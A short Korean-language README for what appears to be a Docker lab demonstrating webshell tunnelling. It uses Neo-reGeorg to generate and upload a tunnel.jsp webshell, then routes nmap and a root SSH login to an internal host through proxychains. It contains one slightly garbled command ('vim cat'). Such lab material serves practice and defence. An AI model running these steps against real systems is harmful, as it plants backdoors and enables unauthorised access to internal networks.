# Tunneling_Webshell-POC
Tunneling_Webshell POC

### 1. Neo-reGeorg 설치 
`git clone https://github.com/L-codes/Neo-reGeorg.git`

### 2. 환경 설치
`git clone https://github.com/jinsu9758/Tunneling_Webshell-POC.git`
`cd Tunneling_Webshell`


### 3. 컨테이너 생성 및 백그라운드 실행
`sudo docker compose up -d`
`sudo docker compose ps`


### 4. 비밀번호를 'password'으로 설정하여 서버 파일 생성
`cd Neo-reGeorg`
`python3 neoreg.py generate -k password`

### 5. 업로드
`생성된 neoreg_servers 경로 하위에 있는 tunnel.jsp 업로드 수행`

### 6. proxychains 패키지 설치
`sudo apt update && sudo apt install proxychains4 -y`

### 7. proxychains4.conf 맨 아래 작성
`sudo vim cat /etc/proxychains4.conf`  
`socks5  127.0.0.1  1080`


### 8. 터널링 쉘 연결
`python3 neoreg.py -k password -u http://{local_ip}:8000/tunnel.jsp`

### 9. proxychains 실행
`proxychains4 nmap 172.30.0.30`
proxychains4 ssh root@172.30.0.30

